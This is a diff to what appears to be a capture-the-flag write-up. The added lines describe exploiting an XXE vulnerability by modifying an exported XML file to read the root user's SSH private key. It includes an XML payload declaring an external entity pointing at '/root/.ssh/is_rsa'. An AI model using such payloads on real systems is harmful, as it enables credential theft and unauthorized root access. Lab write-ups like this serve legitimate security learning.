@@ -204,6 +204,15 @@ public static void main(String[] args) throws JDOMException, IOException, JpegPr
 ```
 * After a quick peak at the box description, I realized I needed to look into the [XXE vulnerability](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file)
 * Reading this Hacktricks article showed me that I needed to edit an xml file, something I couldn't do with the web requests
-* I dec
+* I decided to take the `export.xml` from earlier and modify it with a payload that should return the ssh private key of the root user with the goal of sshing into root
+	* This took a lot of troubleshooting and review of how `App.java` works
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/.ssh/is_rsa"> ]>
+<credits>
+	<author>woodenk</author>
+	...
+```
 
-`<!DOCTYPE foo [<!ENTITY example SYSTEM "/root/.ssh/is_rsa"> ]>`
+ 
